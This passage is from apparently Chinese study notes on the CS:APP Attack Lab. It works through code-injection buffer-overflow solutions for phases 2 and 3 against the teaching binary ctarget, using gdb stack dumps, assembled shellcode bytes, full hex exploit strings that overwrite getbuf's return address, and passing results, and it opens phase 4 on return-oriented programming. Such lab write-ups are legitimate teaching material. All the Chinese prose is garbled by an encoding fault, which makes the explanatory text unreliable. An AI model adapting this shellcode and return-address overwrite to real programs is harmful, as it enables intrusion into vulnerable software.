æ‰€ä»¥å®ç°æ€è·¯åº”è¯¥æ˜¯å¯è¡Œçš„ã€‚ä½†æ˜¯è¿™æ ·å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºexploit stringè¾“å…¥åˆ°getbufåï¼Œgetbufä¼šå°†æ ˆå›æ”¶ï¼Œä¼šå¯¼è‡´rdiæ— æ³•è¢«èµ‹å€¼cookieï¼Œç›´æ¥æ‰§è¡Œåˆ°touch2çš„åœ°å€ã€‚

é‚£ä¹ˆéœ€è¦é‡æ–°æ€è€ƒä¸‹æ€è·¯ï¼š~~å¦‚ä½•ä¿è¯æ ˆä¸ä¼šè¢«å›æ”¶~~ï¼Ÿè¿™æ ·å°±å¯ä»¥è®©getbufæ‰§è¡Œå®Œæ¯•åï¼Œä¸‹ä¸€æ­¥æ‰§è¡Œåœ°å€ç›´æ¥åˆ°æ ˆçš„æ¼æ´ä»£ç ä¸­ã€‚æˆ–è®¸è¿˜æœ‰å…¶ä»–çš„å¥½ç©çš„æ–¹æ³•ï¼Ÿå…¶å®æ ˆå¹¶æ²¡æœ‰è¢«å›æ”¶ï¼Œæ•°æ®å‡å­˜åœ¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘æ¼æ´ä»£ç çš„ç¼–å†™ã€‚

[é‡æ–°æ•´ç†åçš„æ€è·¯](https://github.com/kcxain/CSAPP-Lab/blob/master/Notes/Lab03-Attack_Lab.md)ï¼š

- å°†testè°ƒç”¨getbufä¹‹å‰ä¿å­˜çš„è¿”å›åœ°å€ï¼Œæ”¹ä¸ºæ¼æ´ä»£ç æ‰§è¡Œçš„åœ°å€ã€‚
- æ¼æ´ä»£ç å®ç°ï¼š
  - å°†cookieå€¼èµ‹å€¼ç»™%rdi
  - push touch2çš„åœ°å€
  - ret

è¦æƒ³è·å¾—æ¼æ´ä»£ç æ‰§è¡Œçš„åœ°å€ï¼Œå°±éœ€è¦è·å–æ‰§è¡Œgetbufæ—¶æ ˆé¡¶ï¼ˆ%rspï¼‰ä½ç½®ã€‚åˆæ­¥æƒ³åœ¨getbufåˆ†é…æ ˆç©ºé—´çš„ä½ç½®æ‰“æ–­ç‚¹ï¼Œé€šè¿‡è°ƒè¯•æŸ¥çœ‹rspå³å¯ã€‚

ä½†æ˜¯æˆ‘æ²¡æ³•è®©ç¨‹åºctargetæ­£å¸¸è·‘èµ·æ¥ :( 

æ€è€ƒäº†ä¸€ä¼šï¼Œwocï¼Œç¬¬ä¸€ä¸ªç­”æ¡ˆè¾“å…¥è¿›å»ï¼Œä¸å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†å—ï¼Ÿ

```bash
(gdb) run -q -i exploit-raw.txt 
```

æŸ¥çœ‹getbufåˆ†é…æ ˆç©ºé—´åçš„æ ˆé¡¶ï¼š

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) b *0x4017af
(gdb) continue
Continuing.

Breakpoint 3, 0x00000000004017af in getbuf () at buf.c:14
14      in buf.c

```

åœ¨è°ƒç”¨callä¹‹å‰æŸ¥çœ‹rspçš„å€¼:`0x5561dc78`

```bash
(gdb) print $rsp
$1 = (void *) 0x5561dc78
```

è·å–åˆ°å¯ä»¥æ³¨å…¥æ¼æ´ä»£ç çš„åœ°å€åï¼Œ~~æˆ‘ä»¬å¯ä»¥å°†æœ€åçš„retæŒ‡ä»¤æ”¾åœ¨0x5561dc78ä½ç½®ï¼Œç„¶åè¡¥å……è¿™ä¸ªæ¼æ´ä»£ç ~~ã€‚ï¼ˆè¿™é‡Œå‹˜è¯¯ï¼šå› ä¸ºæ¼æ´ä»£ç çš„æ‰§è¡Œé¡ºåºæ˜¯ä»ä½åœ°å€åˆ°é«˜åœ°å€çš„æ–¹å‘ï¼Œæ ˆç©ºé—´æ˜¯ä»é«˜åœ°å€å‘ç€ä½åœ°å€ç”Ÿé•¿ã€‚è€Œé¡¶ä½ç½®æ­£æ˜¯åœ°å€è¾ƒå°çš„ä½ç½®ï¼Œæ‰€ä»¥æ ˆé¡¶ä½ç½®`0x5561dc78`ä»å¤´å¼€å§‹æ”¾æ¼æ´ä»£ç å³å¯ï¼‰

è·å–touch2çš„åœ°å€ï¼š`0x4017ec`

```bash
(gdb) b touch2
Breakpoint 4 at 0x4017ec: file visible.c, line 40.
```

æ¼æ´ä»£ç `p2.s`ï¼š

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

è·å–æ¼æ´ä»£ç çš„å­—èŠ‚è¡¨ç¤ºï¼š

```bash
unix> gcc -c p2.s
unix> objdump -d p2.o > p2.d
```

`p2.d`å†…å®¹ï¼š

```assembly
  1
  2 p2.o:     file format elf64-x86-64
  3
  4
  5 Disassembly of section .text:
  6
  7 0000000000000000 <.text>:
  8    0: 48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi
  9    7: 68 ec 17 40 00        push   $0x4017ec
 10    c: c3                    ret
~

```

~~å¯ä»¥çœ‹å‡ºè¿™æ®µä»£ç å çš„ç©ºé—´ä¸º13å­—èŠ‚ï¼Œæ‰€ä»¥æ¼æ´ä»£ç çš„æ‰§è¡Œåœ°å€åº”è¯¥æ˜¯æ ˆé¡¶åœ°å€`0x5561dc78`å‡å»`0xd`ï¼Œå³ä¸º`0x5561dc6b`ã€‚~~

æ•°æ®æ„é€ ï¼šæ ¹æ®å°ç«¯å­˜å‚¨çš„ç‰¹æ€§ï¼Œåº”è¯¥å°†è¾“å…¥çš„å­—èŠ‚æ•°æ®ä¸­ï¼Œæ¼æ´ä»£ç æ”¾åœ¨å‰é¢ï¼Œä»è€Œå­˜å‚¨åœ¨æ ˆé¡¶ä½ç½®ï¼›è€Œè¦è¢«æ›¿æ¢çš„è¿”å›åœ°å€è¦åœ¨åé¢å­˜å‚¨ï¼Œä»è€Œå­˜å‚¨åœ¨æ ˆåº•ä½ç½®ã€‚æŒ‰ç…§è¿™æ ·æ„é€ é€»è¾‘ï¼Œå¯ä»¥å®ç°`exploit2.txt`

```tex
c3 00 40 17 ec 68 59 b9
97 fa c7 c7 48 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
6b dc 61 55 00 00 00 00
```

æ‰§è¡Œ

```
unix> ./hex2raw < exploit2.txt > exploit-raw2.txt
unix> ./ctarget -q -i exploit-raw2.txt
```

æŠ¥é”™äº†ï¼ŒæŸ¥çœ‹ä¸‹é—®é¢˜å­˜åœ¨çš„åŸå› ï¼š

```bash
crx@ubuntu:03_attack_lab$ ./hex2raw < exploit2.txt > exploit-raw2.txt
crx@ubuntu:03_attack_lab$ ./ctarget -q -i exploit-raw2.txt
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:C3 00 40 17 EC 68 59 B9 97 FA C7 C7 48 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00

```

å·²ç»ä¿®æ”¹äº†çœŸæ­£çš„æ¼æ´ä»£ç åœ°å€ï¼šæ‰§è¡Œåœ°å€åº”è¯¥æ˜¯æ ˆé¡¶åœ°å€`0x5561dc78`åŠ ä¸Š`0xd`ï¼Œå³ä¸º`0x5561dc85`ã€‚é‡æ–°æ‰§è¡Œï¼Œè¿˜æ˜¯æŠ¥é”™ã€‚

å•æ­¥æ‰§è¡Œä¸‹ï¼Œçœ‹çœ‹æ˜¯å¦å¡«å……å­—ç¬¦åï¼Œæ•°æ®æ€ä¹ˆåˆ†å¸ƒçš„ï¼š

```bash
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
=> 0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) x/50xb $rsp
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcc8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd0:     0xf4    0xf4
(gdb)
```

åœ¨getbfè¿”å›ä¹‹å‰ä¸‹çš„æ–­ç‚¹ï¼Œç„¶åæ‰“å°æ­¤æ—¶æ ˆç©ºé—´çš„æ•°æ®ï¼Œå‘ç°ä»æ ˆé¡¶`0x5561dca0`å¼€å§‹ä¿å­˜çš„å±…ç„¶æ˜¯æ¼æ´çš„æ‰§è¡Œåœ°å€`0x5561dc6b`ï¼Œè€Œæ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œåº”è¯¥ä¿å­˜çš„æ˜¯æ¼æ´ä»£ç ã€‚è€Œæ¼æ´çš„æ‰§è¡Œåœ°å€åº”è¯¥å­˜æ”¾`0x5561dcc8`å³`%rsp + 0x28`ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼ŸğŸ˜¶

å¥½å§ï¼Œè¿™æ ·æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºæ–­ç‚¹æ‰“é”™äº†ï¼Œåº”è¯¥æ˜¯æ‰“åœ¨è¿˜å°šæœªå°†æ ˆç©ºé—´å›æ”¶çš„`0x4017b9`å¤„ï¼Œé‡æ–°æ¥ï¼š

```
(gdb) x/50xb $rsp
0x5561dc78:     0xc3    0x00    0x40    0x17    0xec    0x68    0x59    0xb9
0x5561dc80:     0x97    0xfa    0xc7    0xc7    0x48    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00
```

è¿˜æ˜¯æŠ¥é”™ã€‚

æ€è€ƒåå‘ç°å­˜å‚¨çš„æ—¶å€™ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å°ç«¯å­˜å‚¨å’ŒæŒ‡ä»¤ä»å°åˆ°å¤§çš„åœ°å€è¿›è¡Œæ‰§è¡Œçš„åŸç†ï¼šæœ€åå­˜æ”¾çš„æ¼æ´ä»£ç åœ°å€ï¼Œè¦æ”¾åœ¨æœ€åé¢ï¼Œè¿™ä¸ªæ²¡ä»€ä¹ˆé—®é¢˜ï¼›ä½†æ˜¯æ¼æ´ä»£ç æ€ä¹ˆæ‰§è¡Œå‘¢ï¼Ÿåº”è¯¥æ˜¯ä»ä¹‹å‰çš„æ ˆé¡¶å¾€åœ°å€é«˜çš„åœ°æ–¹æ‰§è¡Œï¼Œæ‰€ä»¥æ ˆé¡¶ä»ä¸‹è‡³ä¸Šï¼ˆåœ°å€ä»ä½åˆ°é«˜ï¼‰ä¿å­˜æŒ‡ä»¤åº”è¯¥ä¾æ¬¡æ˜¯ï¼š

```assembly
0x5561dc78: movq $0x59b997fa,%rdi
		+7	pushq $0x4017ec
		+c	ret
```

æ‰€ä»¥åœ¨æ‹¼è£…`exploit2.txt`çš„æ—¶å€™ï¼Œæœ€å‰é¢çš„æ•°æ®å°±æ˜¯ç›´æ¥æ”¾æ¼æ´ä»£ç çš„å­—èŠ‚è¡¨ç¤º`p2.o`ã€‚ä¹‹å‰å‡ºé”™å°±æ˜¯å› ä¸ºæ²¡æœ‰è€ƒè™‘åˆ°æ ˆçš„åœ°å€æ˜¯ä»ä¸‹åˆ°ä¸Šé€æ¸é€’å¢çš„ã€‚

é‡æ–°æ”¹å†™`exploit2.txt`ï¼š

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
6b dc 61 55 00 00 00 00
```

æ‰§è¡Œè¿˜æ˜¯æŠ¥é”™ï¼ŒæŸ¥çœ‹æ­¤æ—¶æ ˆä¿å­˜çš„æŒ‡ä»¤ï¼š

```assembly
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
=> 0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret

(gdb) x/10i $rsp
   0x5561dc78:  mov    $0x59b997fa,%rdi
   0x5561dc7f:  push   $0x4017ec
   0x5561dc84:  ret
   0x5561dc85:  add    %al,(%rax)
   0x5561dc87:  add    %al,(%rax)
   0x5561dc89:  add    %al,(%rax)
   0x5561dc8b:  add    %al,(%rax)
   0x5561dc8d:  add    %al,(%rax)
   0x5561dc8f:  add    %al,(%rax)
   0x5561dc91:  add    %al,(%rax)

(gdb) x/50xb $rsp
0x5561dc78:     0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0x68
0x5561dc80:     0xec    0x17    0x40    0x00    0xc3    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

è¿™æ ·åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œé‚£æˆ‘ä»¬å•æ­¥æ‰§è¡Œï¼Œçœ‹çœ‹getbufæ‰§è¡Œretåï¼Œrspæ˜¯å¦ä¿å­˜çš„æ˜¯æ¼æ´ä»£ç æ‰§è¡Œä½ç½®...ç­‰ç­‰ï¼Œæˆ‘æ€ä¹ˆä¿å­˜çš„åœ°å€æ˜¯`0x5561dc6b`ï¼Ÿ

æ”¹è¿‡æ¥ä»¥åçš„`exploit2.txt`:

```tex
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

é‡æ–°æ‰§è¡Œå°±å¯ä»¥äº†ï¼š

```bash
unix$ ./ctarget -q -i exploit-raw2.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00

```

## 5.13ï¼ˆdeleteï¼‰

leve2çš„æ€è€ƒï¼šæ¼æ´ä»£ç å­—èŠ‚ç å’Œè¦è¦†ç›–çš„åœ°å€è¦æ€ä¹ˆå†™å…¥åˆ°48ä¸ªå­—èŠ‚ä¸­ï¼Ÿ

Q1:ä¸ºä»€ä¹ˆè¦æ”¾åˆ°48ä¸ªå­—èŠ‚ä¸­ï¼Ÿ

A1:å› ä¸ºè¦ä¿®æ”¹testè°ƒç”¨getbufä¹‹å‰ä¿å­˜çš„åœ°å€ä¿¡æ¯ï¼Œè€Œè¿™ä¸ªä¿¡æ¯è¢«ä¿å­˜åœ¨getbufçš„æ ˆç©ºé—´å¾€ä¸Š40ä¸ªå­—èŠ‚çš„ä½ç½®ï¼Œå ä½ç©ºé—´ä¸º8ä¸ªå­—èŠ‚ï¼ˆvoid*ï¼‰ã€‚

Q2:å¦‚ä½•ç»„ç»‡48ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Ÿ

A2:æ ¹æ®æ ˆç©ºé—´ä»é«˜åˆ°ä½çš„ç”Ÿé•¿ç‰¹æ€§å’Œå°ç«¯å­˜å‚¨çš„ç‰¹æ€§ï¼Œå¯ä»¥å¾—çŸ¥è¾“å…¥çš„æ•°æ®ä»å¼€å§‹åˆ°æœ€åï¼Œå°±æ˜¯æ²¿ç€æ ˆåœ°å€ç©ºé—´ä»ä½åˆ°é«˜çš„æ–¹å‘å­˜å‚¨çš„ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„é—®é¢˜å°±æ˜¯å°ç«¯å­˜å‚¨çš„åœ°å€ä¿¡æ¯`0x5561dc78`ï¼Œå®é™…åœ¨ç¬¬40ä¸ªå­—èŠ‚å¤„çš„åå…­è¿›åˆ¶ä¿å­˜å½¢å¼ä¸º`78 dc 61 55 00 00 00 00`ã€‚

è‡³äºæ¼æ´ä»£ç ï¼Œç›´æ¥ä»0å­—èŠ‚å¼€å§‹æ­£å¸¸ä¿å­˜å³å¯ã€‚æ‰€ä»¥ç»„ç»‡å½¢å¼å°±æ˜¯å¼€å§‹ä¿å­˜æ¼æ´ä»£ç ï¼Œç„¶åå¡«å……0ï¼Œç›´åˆ°ç¬¬40ä¸ªå­—èŠ‚å¼€å§‹å¡«å……è¦ä¿®æ”¹çš„åœ°å€ä¿¡æ¯ï¼š`78 dc 61 55 00 00 00 00`ã€‚

### phase3

é¦–å…ˆç†è§£å‡½æ•°`hexmatch`åŠŸèƒ½ï¼š

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
 }
```

`sprintf(s, "%.8x", val);`:å°†`unsigned`ç±»å‹çš„å€¼valï¼Œå­˜å‚¨åœ¨å­—ç¬¦æŒ‡é’ˆsæ‰€æŒ‡çš„åœ°å€å¤„ï¼Œè€Œ`s`çš„ä½ç½®æ˜¯éšæœºçš„ã€‚é‚£ä¹ˆå¦‚æœval=0x12345678ï¼Œé‚£ä¹ˆså¤„å­˜çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå­˜çš„å°±æ˜¯12345678çš„å­—ç¬¦å½¢å¼â€œ12345678â€ã€‚ç„¶åä»ä½åˆ°é«˜çš„16è¿›åˆ¶æ•°æ®ä¸º`31 32 33 34 35 36 37 38`ã€‚

é‚£ä¹ˆè¿™ä¸ªå‡½æ•°`hexmatch`åŠŸèƒ½å°±å¯ä»¥ç†è§£äº†ï¼š

å°†ä¸€ä¸ªæ— ç¬¦å·æ•´å‹å˜é‡å‚æ•°è½¬æ¢ä¸ºå­—ç¬¦ä¸²åï¼Œè·Ÿå¦ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡çš„å‰9ä¸ªå­—ç¬¦è¿›è¡Œæ¯”å¯¹ï¼Œç›¸åŒè¿”å›1ï¼Œä¸åŒè¿”å›0ã€‚

ç„¶åé¢˜ç›®è®©æˆ‘ä»¬ç›´æ¥æ‰§è¡Œtouch3ä¸è¿”å›testï¼Œçœ‹ä¸‹touch3çš„ä»£ç ï¼š

```C
 void touch3(char *sval)
{
    vlevel = 3;
    /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
 }
```

ä¹Ÿå°±æ˜¯è¯´è¦æƒ³è®©touch3æˆåŠŸæ‰§è¡Œï¼Œå°±éœ€è¦è®©touch3çš„å…¥å‚å­—ç¬¦ä¸²è·Ÿæ•´å‹cookieçš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ç›¸åŒæ‰å¯ä»¥ã€‚

ç°åœ¨cookieçš„æ— ç¬¦å·æ•´å‹è¡¨ç¤ºä¸ºï¼š`0x59b997fa`ï¼Œå­—ç¬¦è¡¨ç¤ºä¸º`35 39 62 39 39 37 66 61 00`.~~å®é™…å°ç«¯å­˜å‚¨çš„å½¢å¼æ˜¯`fa97b959`ã€‚æ‰€ä»¥å…¶å­—ç¬¦ä¸²çš„è¡¨ç¤ºä¸º`66 61 39 37 62 39 35 39 00`ã€‚æ‰€ä»¥è¾“å…¥çš„å­—ç¬¦ä¸²å°±å¯ä»¥ç¡®å®šæ˜¯è¿™æ ·çš„äº†ã€‚~~

leve3çš„å¤§ä½“å®ç°æ€è·¯ï¼š

- å°†getbufæ‰§è¡Œå®Œåçš„è¿”å›åœ°å€æ”¹ä¸ºæ¼æ´ä»£ç çš„åœ°å€ã€‚
- æ¼æ´ä»£ç éœ€è¦å®ç°ä¸‹é¢å‡ ä¸ªåŠŸèƒ½ï¼š
  - å°†å…¥å‚ç½®ä¸ºæŒ‡å‘ä¸€æ®µå€¼ä¸º`35 39 62 39 39 37 66 61 00`çš„æŒ‡é’ˆã€‚
  - è°ƒç”¨touch3å‡½æ•°

è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè°ƒç”¨touch3çš„æ—¶å€™ï¼ŒåŸå…ˆgetbufç”¨äºå­˜å‚¨æ•°æ®çš„æ ˆï¼Œå°±ä¼šè¢«å‡½æ•° hexmatch and strncmpç”¨æ¥å­˜å‚¨æ•°æ®ã€‚å¦‚æœè¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆç©ºé—´æ•°æ®æ­£å¥½å†™å…¥åˆ°äº†æ¼æ´ä»£ç çš„ä½ç½®ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æœ¬æ¬¡æ”»å‡»ä»£ç å¤±è´¥ã€‚

é‚£ä¹ˆæ€ä¹ˆæ‰èƒ½ä¿æŠ¤getbufä¸­å†™å…¥çš„æ¼æ´ä»£ç å‘¢ï¼Ÿå¯ä»¥è€ƒè™‘æŠŠ`cookie`çš„å­—ç¬¦ä¸²æ•°æ®å­˜åœ¨`test`çš„æ ˆä¸Šï¼Œå…¶å®ƒéƒ¨åˆ†ä¸ä¸Šé¢˜ç›¸åŒã€‚

å®ç°æ€è·¯æ˜¯ï¼š

å°†getbufçš„è¿”å›åœ°å€æ”¹ä¸ºæ¼æ´ä»£ç çš„ä½ç½®ï¼Œç„¶åè¿”å›åœ°å€ä¸Šé¢ä¿å­˜cookieå­—ç¬¦ä¸²è¡¨ç¤ºã€‚æ¼æ´ä»£ç å°†rdiç½®ä¸ºcookieå­—ç¬¦ä¸²ä¿å­˜çš„ä½ç½®ï¼Œç„¶åå°†touch3çš„ä½ç½®`0x4018fa`pushåˆ°æ ˆä¸­ï¼Œç„¶åretï¼Œè®©ç¨‹åºè®¡æ•°å™¨æ‰§è¡Œtouch3ã€‚

è¿™æ ·æ•°æ®å°±æœ‰56ä¸ªå­—èŠ‚çš„æ•°æ®äº†ï¼Œæ ˆé¡¶åœ°å€ä¸º`0x5561dc78`ï¼Œæ‰€ä»¥cookieå­—ç¬¦ä¸²ä¿å­˜çš„ä½ç½®å°±æ˜¯æ ˆé¡¶åœ°å€å‘ä¸Šçš„ç¬¬48ä¸ªå­—èŠ‚(ä»0å¼€å§‹)çš„ä½ç½®ï¼š`0x5561dcA8`ï¼Œä¿å­˜çš„æ•°æ®æ˜¯`35 39 62 39 39 37 66 61 00`

æ¼æ´ä»£ç ç¼–å†™ä¸ºï¼š

```assembly
movq $0x5561dcA8,%rdi
push $0x4018fa
ret
```

å¯¹åº”çš„å­—èŠ‚ç ä¸ºï¼š

```assembly
  1
  2 p3.o:     file format elf64-x86-64
  3
  4
  5 Disassembly of section .text:
  6
  7 0000000000000000 <.text>:
  8    0: 48 c7 c7 a8 dc 61 55  mov    $0x5561dca8,%rdi
  9    7: 68 fa 18 40 00        push   $0x4018fa
 10    c: c3   
```

è¿™æ ·æ€»çš„è¾“å…¥å­—ç¬¦ä¸²ä¸ºï¼š

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

å°†å…¶è½¬æ¢ä¸ºè¾“å…¥å­—ç¬¦ä¸²åï¼Œæ‰§è¡Œç»“æœï¼š

```bash
crx@ubuntu:03_attack_lab$ ./ctarget -q -i exploit3-raw.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

ç”¨æ—¶4hï¼Œå¡ä½æˆ‘çš„ä¸»è¦é—®é¢˜æ˜¯ï¼š

1. `sprintf`å‡½æ•°ä½œç”¨ï¼šæ˜¯å°†ä¸€ä¸ªå‚æ•°ä»¥æŸç§å½¢å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åä¿å­˜åœ¨æŸä¸ªå­—ç¬¦ä¸²æŒ‡é’ˆå¤„ã€‚åœ¨è¿™ä¸ªé¢˜ç›®ä¸­ï¼Œæ˜¯å°†cookieä»£è¡¨çš„unsignedç±»å‹çš„å€¼`0x59b997fa`æ ¼å¼åŒ–ä¸ºä¸€ä¸ªä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²â€œ59b997faâ€ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨å­—ç¬¦ä¸²æ•°ç»„ `s` ä¸­ã€‚è€Œå­—ç¬¦ä¸²`"59b997fa"`çš„å®é™…æ˜¯æŒ‰ç…§æ¯ä¸ªå­—ç¬¦çš„asciiç æ¥è¡¨ç¤ºçš„ï¼Œå³ä¸º`35 39 62 39 39 37 66 61`ã€‚è¿™é‡ŒèŠ±äº†å¤§é‡æ—¶é—´å»è€ƒè™‘æ•°å€¼ç±»å‹çš„cookieåˆ°åº•è¢«è½¬æ¢æˆä»€ä¹ˆå­—ç¬¦ä¸²äº†ï¼Œå…¶å®è¿™é‡Œsprintfçš„æœ¬è´¨å°±æ˜¯å°†æ•°æ®ä»¥16è¿›åˆ¶å½¢å¼æ‰“å°å‡ºæ¥ï¼Œå¹¶å°†æ‰“å°ç»“æœå­˜å‚¨èµ·æ¥:

   > [The C library function **int sprintf(char \*str, const char \*format, ...)** sends formatted output to a string pointed to, by **str**.](https://www.tutorialspoint.com/c_standard_library/c_function_sprintf.htm)

   è¿™ä¸ªé—®é¢˜æš´éœ²å‡ºæ¥çš„å¼±ç‚¹å°±æ˜¯ä¸ç†è§£å‡½æ•°åˆ°åº•åšäº†ä»€ä¹ˆï¼Œå¯¼è‡´èŠ±çš„æ—¶é—´å¾ˆå¤š

2. è®¡ç®—å­—ç¬¦ä¸²ä¿å­˜çš„ä½ç½®ï¼šå› ä¸ºgetbufç”³è¯·äº†`0x24`åè¿›åˆ¶ä¸º40çš„æ ˆç©ºé—´ï¼Œæ‰€ä»¥ä»0å¼€å§‹çš„è¯ï¼Œ40åˆ°47å­˜æ”¾çš„æ˜¯æ¼æ´ä»£ç åœ°å€ï¼Œç„¶å48åˆ°55å­˜æ”¾çš„æ˜¯cookieåå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ã€‚

3. å¦ä¸€ä¸ªå°±æ˜¯æ–°çŸ¥è¯†ï¼šæ—¢ç„¶æ ˆä¼šè¢«æ–°çš„å‡½æ•°å‚æ•°å¡«å…¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ¼æ´ä»£ç å¤±æ•ˆï¼Œé‚£ä¹ˆæˆ‘å°±åœ¨testå‡½æ•°ä¸Šå­˜æ”¾ä¸€äº›æ•°æ®ã€‚

ç°åœ¨å»æ‹¿çœ¼é•œã€‚

## 5.14(delete)

### phase4

[**è¿”å›å¯¼å‘ç¼–ç¨‹**](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/) (Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨ **æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚**

